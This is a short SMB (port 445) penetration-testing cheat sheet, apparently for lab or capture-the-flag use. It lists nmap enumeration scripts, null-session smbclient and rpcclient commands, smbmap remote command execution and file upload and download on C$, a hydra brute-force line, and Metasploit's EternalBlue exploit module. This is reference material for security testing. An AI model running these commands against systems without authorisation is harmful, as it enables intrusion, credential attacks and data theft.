# SMB Enumeration & Exploitation (TCP/445)

## Nmap NSE

sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -p445 --script smb-os-discovery <TARGET_IP>
nmap -p445 --script smb-protocols,smb-security-mode <TARGET_IP>
nmap -p445 --script smb-enum-sessions <TARGET_IP>
nmap -p445 --script smb-enum-shares <TARGET_IP>
nmap -p445 --script smb-enum-users <TARGET_IP>
nmap -p445 --script smb-server-stats <TARGET_IP>
nmap -p445 --script "smb-enum-*,smb-ls" <TARGET_IP>
nmap -p445 --script smb-vuln-* <TARGET_IP>
Null / Auth Sessions

smbclient -L //<TARGET_IP> -N
smbclient -L //<TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/<SHARE> -U "<USER>%<PW>"

smbmap

smbmap -H <TARGET_IP> -u guest -p ""
smbmap -H <TARGET_IP> -u <USER> -p '<PW>'
smbmap -H <TARGET_IP> -u <USER> -p '<PW>' -x 'ipconfig'
smbmap -H <TARGET_IP> -u <USER> -p '<PW>' -L
smbmap -H <TARGET_IP> -u <USER> -p '<PW>' -r 'C$'
smbmap -H <TARGET_IP> -u <USER> -p '<PW>' --upload '/root/file' 'C$\file'
smbmap -H <TARGET_IP> -u <USER> -p '<PW>' --download 'C$\flag.txt'

enum4linux

enum4linux -a <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -n <TARGET_IP>   # check <20> for null sessions

rpcclient (null to start)
rpcclient -U "" -N <TARGET_IP>

enumdomusers
enumdomgroups
lookupnames Administrator

Brute (only when justified)

hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb

MS17-010 Quick Check / Exploit

nmap --script smb-vuln-ms17-010 -p445 <TARGET_IP>

# Metasploit

use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
